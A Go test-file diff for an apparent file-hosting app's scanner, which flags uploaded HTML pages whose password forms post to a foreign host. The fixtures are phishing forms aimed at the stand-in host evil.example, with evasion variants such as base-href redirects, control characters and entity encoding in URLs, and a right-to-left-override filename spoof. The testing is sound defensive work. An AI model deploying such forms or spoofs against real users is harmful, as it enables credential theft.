@@ -11,6 +11,7 @@ import (
 	"sort"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/mrRedSun/redrop/internal/config"
 	"github.com/mrRedSun/redrop/internal/store"
@@ -31,6 +32,14 @@ func TestCredentialForm(t *testing.T) {
 		"uppercase tags":         `<FORM ACTION="https://EVIL.example."><INPUT TYPE="password"></FORM>`,
 		"entity-encoded":         `<form action="https&#58;//evil.example/"><input type="password"></form>`,
 		"self-closing input":     `<form action="https://evil.example"><input type="password"/></form>`,
+		"nested form":            `<form action="https://evil.example"><form action="/ok"><input type="password"></form></form>`,
+		"base href":              `<base href="https://evil.example/"><form action="collect"><input type="password"></form>`,
+		"tab in url":             "<form action=\"ht\ttps://evil.example\"><input type=\"password\"></form>",
+		"newline in url":         "<form action=\"https://evil\n.example\"><input type=\"password\"></form>",
+		"leading C0 control":     "<form action=\"\x01https://evil.example\"><input type=\"password\"></form>",
+		"entity-encoded base":    `<base href="https&#58;//evil.example/"><form action="x"><input type="password"></form>`,
+		"base with trailing dot": `<base href="https://EVIL.example./"><form action="/collect"><input type="password"></form>`,
+		"first base wins":        `<base href="https://evil.example/"><base href="https://ok.example/"><form action="x"><input type="password"></form>`,
 	}
 	for name, doc := range flagged {
 		if got := credentialForm(strings.NewReader(doc), ownHost); got != "evil.example" {
@@ -50,6 +59,9 @@ func TestCredentialForm(t *testing.T) {
 		"in a comment":           `<!-- <form action="https://evil.example"><input type="password"></form> -->`,
 		"in a textarea":          `<textarea><form action="https://evil.example"><input type="password"></form></textarea>`,
 		"duplicate attribute":    `<form action="/ok" action="https://evil.example"><input type="password"></form>`,
+		"padded type":            `<form action="https://evil.example"><input type=" password"></form>`,
+		"base on own host":       `<base href="https://` + ownHost + `/"><form action="login"><input type="password"></form>`,
+		"second base ignored":    `<base href="https://` + ownHost + `/"><base href="https://evil.example/"><form action="x"><input type="password"></form>`,
 		"not html":               "MZ\x90\x00binary\x00<<<>>>",
 	}
 	for name, doc := range clean {
@@ -162,13 +174,29 @@ func TestScanFiles(t *testing.T) {
 	if found, _ := scanFiles(ctx, []store.File{file("notes.txt", "page", b, "text/plain")}, ownHost, b.open); len(found) != 0 {
 		t.Fatalf("text file flagged: %v", kinds(found))
 	}
-	// Untrusted names are cleaned and shortened.
+	// Untrusted names are cleaned and shortened, and bidi controls never
+	// survive the cleaning: a short name proves the strip itself, not a
+	// truncation side effect.
 	long := strings.Repeat("a", 300) + "\u202e\n.exe"
 	found, _ = scanFiles(ctx, []store.File{file(long, "plain", b, "")}, ownHost, b.open)
 	if len(found) != 1 || len([]rune(strings.SplitN(found[0].detail, ": ", 2)[0])) != maxFindingPath+1 || strings.ContainsAny(found[0].detail, "\n\u202e") {
 		t.Fatalf("long name: %q", found[0].detail)
 	}
+	bidiName := "invoice\u202egpj.exe"
+	found, _ = scanFiles(ctx, []store.File{file(bidiName, "plain", b, "")}, ownHost, b.open)
+	if len(found) != 1 || found[0].detail != "invoicegpj.exe: Windows program (.exe)" || strings.ContainsAny(found[0].detail, "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069") {
+		t.Fatalf("bidi name: %q", found[0].detail)
+	}
+	if cleanText("a\u202eb\u2067c", true) != "abc" {
+		t.Fatalf("cleanText keeps bidi controls: %q", cleanText("a\u202eb\u2067c", true))
+	}
 }
+
+// blockedReader never yields and never ends: only a deadline gets out.
+type blockedReader struct{}
+
+func (blockedReader) Read([]byte) (int, error) { <-make(chan struct{}); return 0, io.EOF }
+func (blockedReader) Close() error             { return nil }
 
 func TestScanFilesBounds(t *testing.T) {
 	b := blobs{"big": append([]byte(`<p>`+strings.Repeat("x", 4096)+`</p>`), []byte(`<form action="https://evil.example/"><input type="password"></form>`)...)}
@@ -191,12 +219,20 @@ func TestScanFilesBounds(t *testing.T) {
 	}
 	scanTotalBytes = 32 << 20
 
-	// The deadline.
-	ctx, cancel := context.WithCancel(context.Background())
-	cancel()
-	if found, complete := scanFiles(ctx, files, ownHost, b.open); complete || len(found) != 0 {
-		t.Fatalf("cancelled scan: %v %v", kinds(found), complete)
+	// The deadline: a reader that never returns ends the scan after the
+	// context's deadline, reported incomplete with no finding.
+	defer func(v time.Duration) { scanTimeout = v }(scanTimeout)
+	scanTimeout = 10 * time.Millisecond
+	block := func(string) (io.ReadCloser, error) {
+		return blockedReader{}, nil
 	}
+	ctx, cancel := context.WithTimeout(context.Background(), scanTimeout)
+	defer cancel()
+	stuck := store.File{Path: "index.html", Blob: "x", Size: 10, ContentType: "text/html"}
+	if found, complete := scanFiles(ctx, []store.File{stuck}, ownHost, block); complete || len(found) != 0 {
+		t.Fatalf("scan past the deadline: %v %v", kinds(found), complete)
+	}
+	scanTimeout = 5 * time.Second
 	// An unreadable blob ends the scan without a finding or a panic.
 	if found, complete := scanFiles(context.Background(), []store.File{{Path: "x.html", Blob: "gone", Size: 10, ContentType: "text/html"}}, ownHost, b.open); complete || len(found) != 0 {
 		t.Fatalf("missing blob: %v %v", kinds(found), complete)
